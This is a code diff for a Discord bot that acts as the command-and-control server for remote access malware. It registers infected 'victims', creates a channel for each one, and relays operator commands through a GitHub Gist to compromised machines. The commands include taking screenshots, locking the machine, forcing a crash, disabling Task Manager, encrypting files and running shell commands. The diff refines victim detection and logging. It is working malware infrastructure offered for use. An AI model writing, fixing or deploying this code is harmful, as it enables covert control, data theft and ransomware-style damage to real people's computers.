@@ -189,8 +189,8 @@ import requests
 import json
 
 TOKEN = "YOUR_DISCORD_BOT_TOKEN"
-GUILD_ID = 123456789012345678
-LOG_CHANNEL_ID = 987654321098765432
+GUILD_ID = 123456789012345678  # Server ID
+LOG_CHANNEL_ID = 987654321098765432  # Webhook channel ID — TRIPLE CHECK THIS
 GIST_ID = "3bc0ef1bad059fdf147b42ea06bca7df"
 GH_TOKEN = "ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 
@@ -198,6 +198,7 @@ FIXED_RAW_URL = "https://gist.githubusercontent.com/IDKwhyimhereDoyou/3bc0ef1bad
 
 intents = discord.Intents.default()
 intents.message_content = True
+intents.messages = True
 
 client = discord.Client(intents=intents)
 
@@ -208,64 +209,76 @@ def update_gist(commands_dict):
     headers = {"Authorization": f"token {GH_TOKEN}"}
     data = {"files": {"commands.json": {"content": json.dumps(commands_dict)}}}
     r = requests.patch(url, headers=headers, json=data)
-    print(f"Gist update: {r.status_code}")
+    print(f"[GIST] Update status: {r.status_code}")
 
 async def create_victim_section(vid):
     guild = client.get_guild(GUILD_ID)
+    if not guild:
+        print("[FATAL] Wrong GUILD_ID - bot can't see server")
+        return None
     cat = await guild.create_category(f"Victim-{vid}")
     ch = await cat.create_text_channel(f"logs-{vid}", overwrites={
         guild.default_role: discord.PermissionOverwrite(read_messages=False),
         guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
     })
+    print(f"[+] Victim section created for {vid}")
     return ch
 
 @client.event
 async def on_ready():
-    print(f"[+] Bot ready - commands: -ss, -lock, -bsod, -disabletm, -encrypt [path], -shell [cmd], -clear")
+    print(f"[+] Bot online - watching channel ID {LOG_CHANNEL_ID} for bites")
+    print(f"[+] FIXED_RAW_URL: {FIXED_RAW_URL}")
 
 @client.event
 async def on_message(message):
-    if message.author.bot: return
+    # LOG EVERY MESSAGE THE BOT SEES - NO FILTERS
+    print(f"\n[RAW MESSAGE] Channel ID: {message.channel.id} | Name: {getattr(message.channel, 'name', 'DM')} | Webhook: {message.webhook_id} | Author: {message.author}")
+    print(f"Content: {message.content}")
+    if message.embeds:
+        for i, embed in enumerate(message.embeds):
+            print(f"Embed {i} title: {embed.title}")
+            print(f"Embed {i} description: {embed.description}")
+            print(f"Embed {i} fields: {embed.fields}")
 
-    # Bite detection (kept simple)
-    if message.channel.id == LOG_CHANNEL_ID:
-        full_text = message.content + " ".join([e.title or "" for e in message.embeds] + [e.description or "" for e in message.embeds])
-        if "BITE" in full_text.upper() or "CAPTAIN" in full_text.upper():
-            vid_match = re.search(r"([a-f0-9]{8})", full_text)
-            if vid_match:
-                vid = vid_match.group(1)
-                if vid not in known_victims:
-                    known_victims.add(vid)
-                    ch = await create_victim_section(vid)
+    # BITE DETECTION - aggressive
+    full_text = message.content
+    for embed in message.embeds:
+        full_text += " " + str(embed.title or "") + " " + str(embed.description or "")
+        for field in embed.fields:
+            full_text += " " + str(field.name) + " " + str(field.value)
+    
+    print(f"[PARSE TEXT] {full_text}")
+
+    # Look for ANY 8-char hex — that's our Victim ID
+    vid_match = re.search(r"([a-f0-9]{8})", full_text, re.IGNORECASE)
+    if vid_match:
+        vid = vid_match.group(1).lower()
+        print(f"[ID FOUND] Possible Victim ID: {vid}")
+        if "bite" in full_text.lower() or "captain" in full_text.lower() or "victim" in full_text.lower():
+            if vid not in known_victims:
+                known_victims.add(vid)
+                print(f"[!!!] NEW BITE CONFIRMED - {vid}")
+                ch = await create_victim_section(vid)
+                if ch:
                     await message.reply(f"**BITE** Victim **{vid}** hooked — Room: {ch.mention}")
 
-    # Commands - tolerant to extra dashes
-    if message.channel.name.startswith("logs-"):
-        content = message.content.lstrip("- ").strip().lower()  # Strip all leading dashes/spaces
-        if not content: return
-        
-        parts = content.split(" ", 1)
+    # COMMANDS - tolerant
+    if getattr(message.channel, 'name', '').startswith("logs-") and message.content.startswith("-"):
+        vid = message.channel.name[5:13]
+        clean_cmd = message.content.lstrip("- ").strip().lower()
+        parts = clean_cmd.split(" ", 1)
         cmd = parts[0]
         arg = parts[1] if len(parts) > 1 else ""
+        full_cmd = cmd if cmd not in ["encrypt", "shell"] else f"{cmd} {arg}"
         
-        vid = message.channel.name[5:13]
-        
-        if cmd == "clear":
-            current = requests.get(FIXED_RAW_URL).json() or {}
-            if vid in current:
-                del current[vid]
-                update_gist(current)
-                await message.reply(f"Cleared queue for **{vid}**")
-            return
-        
-        full_cmd = cmd
-        if cmd in ["encrypt", "shell"]:
-            full_cmd = f"{cmd} {arg}"
-        
-        current = requests.get(FIXED_RAW_URL).json() or {}
+        current = {}
+        try:
+            current = requests.get(FIXED_RAW_URL).json()
+        except:
+            pass
         current[vid] = full_cmd
         update_gist(current)
         
-        await message.reply(f"**{full_cmd}** queued for **{vid}** — hits in <30s")
+        await message.reply(f"**{full_cmd}** queued for **{vid}** — live in <30s")
 
 client.run(TOKEN)
